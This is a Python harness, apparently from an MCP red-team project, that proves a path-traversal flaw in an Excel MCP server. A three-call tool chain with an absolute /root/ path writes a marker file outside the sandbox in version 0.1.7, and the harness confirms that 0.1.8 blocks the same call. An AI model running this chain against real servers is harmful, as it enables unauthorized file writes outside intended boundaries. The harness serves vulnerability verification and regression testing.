"""Deterministic exploit proof for real-world MCP targets (no LLM).

``prove_target`` replays a fixed call chain over ``McpSession`` and verifies the
outcome out-of-band with ``docker exec`` (list-form subprocess only):

- exploited (excel-0.1.7): create_workbook -> write_data_to_excel ->
  read_data_from_excel with an absolute marker path under /root/ (outside the
  EXCEL_FILES_PATH sandbox); the marker must exist on disk and A1 must equal
  the nonce.
- blocked (excel-0.1.8): create_workbook with the same absolute path must be
  rejected (must be relative / Invalid filename) and no marker may appear.

Docker CLI or container missing -> FAIL with a "run deploy.ps1 --yes" hint;
containers are never auto-started.

Usage:
    python -m eval.realworld.prove excel-0.1.7 -o runs/realworld/prove
"""

from __future__ import annotations

import argparse
import asyncio
import secrets
import shutil
import subprocess
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path

import yaml

from mcp_redteam.targets.mcp_client import McpSession

_ERROR_MARKERS = ("error", "failed", "invalid", "must be relative")
_BLOCKED_MARKERS = ("must be relative", "Invalid filename")


class _StepError(Exception):
    """Raised when any prove assertion fails; carries the failing step text."""


@dataclass
class _CallResult:
    result_text: str


def _load_targets() -> list[dict]:
    path = Path(__file__).with_name("targets.yaml")
    return yaml.safe_load(path.read_text(encoding="utf-8"))["targets"]


def _get_target(name: str) -> dict:
    for target in _load_targets():
        if target["name"] == name:
            return target
    choices = ", ".join(t["name"] for t in _load_targets())
    raise ValueError(f"unknown target {name!r}; choices: {choices}")


def _make_nonce() -> str:
    """MCPWN-<UTC timestamp %Y%m%dT%H%M%S>-<6 hex chars>."""
    stamp = datetime.now(UTC).strftime("%Y%m%dT%H%M%S")
    return f"MCPWN-{stamp}-{secrets.token_hex(3)}"


def _text_has(text: str, markers: tuple[str, ...]) -> bool:
    low = text.lower()
    return any(m.lower() in low for m in markers)


async def _call(session: McpSession, tool: str, args: dict) -> _CallResult:
    """call_tool, surfacing tool errors (exceptions or error text) as text."""
    try:
        call = await session.call_tool(tool, args)
        return _CallResult(call.result_text)
    except Exception as exc:  # noqa: BLE001 - tool errors also arrive as exceptions
        return _CallResult(f"{type(exc).__name__}: {exc}")


def _docker_exec(
    container: str, args: list[str], timeout: int = 60
) -> subprocess.CompletedProcess[str]:
    """docker exec in list form; never build shell strings."""
    return subprocess.run(
        ["docker", "exec", container, *args],
        capture_output=True,
        text=True,
        check=False,
        timeout=timeout,
    )


def _check_docker(container: str) -> str | None:
    """Return an error message when docker/container is unavailable, else None."""
    if shutil.which("docker") is None:
        return "docker CLI not found on PATH"
    probe = subprocess.run(
        ["docker", "inspect", container],
        capture_output=True,
        text=True,
        check=False,
    )
    if probe.returncode != 0:
        return f"container {container!r} not found/stopped (docker inspect failed)"
    return None


def _fmt_proc(proc: subprocess.CompletedProcess[str]) -> str:
    parts = [f"returncode={proc.returncode}"]
    if proc.stdout.strip():
        parts.append(f"stdout={proc.stdout.strip()!r}")
    if proc.stderr.strip():
        parts.append(f"stderr={proc.stderr.strip()!r}")
    return "; ".join(parts)


async def _prove_exploited(
    target: dict,
    marker: str,
    nonce: str,
    steps: list[dict],
    oob: dict[str, str],
) -> None:
    async with McpSession(target["sse_url"]) as session:
        c1 = await _call(session, "create_workbook", {"filepath": marker})
        steps.append(
            {"tool": "create_workbook", "args": {"filepath": marker}, "text": c1.result_text}
        )
        if _text_has(c1.result_text, _ERROR_MARKERS):
            raise _StepError(
                f"create_workbook (exploited) returned an error: {c1.result_text[:500]!r}"
            )

        args2 = {"filepath": marker, "sheet_name": "Sheet1", "data": [[nonce]]}
        c2 = await _call(session, "write_data_to_excel", args2)
        steps.append({"tool": "write_data_to_excel", "args": args2, "text": c2.result_text})
        if _text_has(c2.result_text, _ERROR_MARKERS):
            raise _StepError(
                f"write_data_to_excel (exploited) returned an error: {c2.result_text[:500]!r}"
            )

        args3 = {"filepath": marker, "sheet_name": "Sheet1"}
        c3 = await _call(session, "read_data_from_excel", args3)
        steps.append({"tool": "read_data_from_excel", "args": args3, "text": c3.result_text})
        if nonce not in c3.result_text:
            raise _StepError(
                f"read_data_from_excel did not echo nonce back: {c3.result_text[:500]!r}"
            )

    ls = _docker_exec(target["container"], ["ls", "-la", marker])
    oob["docker_ls"] = _fmt_proc(ls)
    if ls.returncode != 0:
        raise _StepError(f"out-of-band ls failed, marker not on disk: {oob['docker_ls']}")

    code = (
        "from openpyxl import load_workbook; "
        f"print(load_workbook({marker!r}).active['A1'].value)"
    )
    readback = _docker_exec(target["container"], ["python", "-c", code])
    oob["docker_readback"] = _fmt_proc(readback)
    if readback.returncode != 0 or readback.stdout.strip() != nonce:
        raise _StepError(f"out-of-band readback != nonce: {oob['docker_readback']}")


async def _prove_blocked(
    target: dict,
    marker: str,
    steps: list[dict],
    oob: dict[str, str],
) -> None:
    async with McpSession(target["sse_url"]) as session:
        c1 = await _call(session, "create_workbook", {"filepath": marker})
        steps.append(
            {"tool": "create_workbook", "args": {"filepath": marker}, "text": c1.result_text}
        )
        if not _text_has(c1.result_text, _BLOCKED_MARKERS):
            raise _StepError(
                f"create_workbook (blocked) did not reject absolute path: {c1.result_text[:500]!r}"
            )

    ls = _docker_exec(target["container"], ["ls", "-la", marker])
    oob["docker_ls"] = _fmt_proc(ls)
    if ls.returncode == 0:
        raise _StepError(
            f"blocked target: marker exists on disk despite rejection: {oob['docker_ls']}"
        )


async def prove_target(name: str, out_dir: Path) -> Path:
    """Prove exploitability of one target; write ``out_dir/proof_report.md``."""
    out_dir.mkdir(parents=True, exist_ok=True)
    target = _get_target(name)
    nonce = _make_nonce()
    marker = target["marker_path"].replace("<nonce>", nonce)
    steps: list[dict] = []
    oob: dict[str, str] = {}

    docker_err = _check_docker(target["container"])
    if docker_err is not None:
        final, failure = "FAIL", f"{docker_err}; run deploy.ps1 --yes first"
    else:
        try:
            if target["prove_expect"] == "exploited":
                await _prove_exploited(target, marker, nonce, steps, oob)
            else:
                await _prove_blocked(target, marker, steps, oob)
            final, failure = "PASS", None
        except _StepError as exc:
            final, failure = "FAIL", str(exc)

    report_path = out_dir / "proof_report.md"
    _write_report(target, nonce, marker, steps, oob, final, failure, report_path)
    print(f"[realworld] prove {name}: {final}" + (f" ({failure})" if failure else ""))
    return report_path


def _write_report(
    target: dict,
    nonce: str,
    marker: str,
    steps: list[dict],
    oob: dict[str, str],
    final: str,
    failure: str | None,
    report_path: Path,
) -> None:
    lines: list[str] = [
        "# Real-World Exploit Proof Report",
        "",
        f"- **target**: {target['name']}",
        f"- **version**: {target['version']}",
        f"- **cve**: {target['cve'] or '(none)'}",
        f"- **prove_expect**: {target['prove_expect']}",
        f"- **nonce**: `{nonce}`",
        f"- **marker**: `{marker}`",
        "",
        "## In-band calls (McpSession)",
        "",
    ]
    for i, step in enumerate(steps, 1):
        lines.append(f"### step {i}: `{step['tool']}`")
        lines.append("")
        lines.append(f"- args: `{step['args']}`")
        lines.append(f"- result_text: `{step['text'][:500]}`")
        lines.append("")
    lines.append("## Out-of-band (docker exec)")
    lines.append("")
    if oob:
        for key, value in oob.items():
            lines.append(f"- **{key}**: `{value}`")
    else:
        lines.append("- (not run)")
    lines.append("")
    lines.append("## Verdict")
    lines.append("")
    lines.append(f"**{final}**" + (f" — {failure}" if failure else ""))
    lines.append("")
    report_path.write_text("\n".join(lines), encoding="utf-8")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument(
        "name", help="target name from targets.yaml (excel-0.1.7 / excel-0.1.8)"
    )
    parser.add_argument(
        "-o", "--out", default="runs/realworld/prove",
        help="output directory; <out>/<name>/proof_report.md is written",
    )
    args = parser.parse_args()
    report = asyncio.run(prove_target(args.name, Path(args.out) / args.name))
    print(f"wrote {report}")


if __name__ == "__main__":
    main()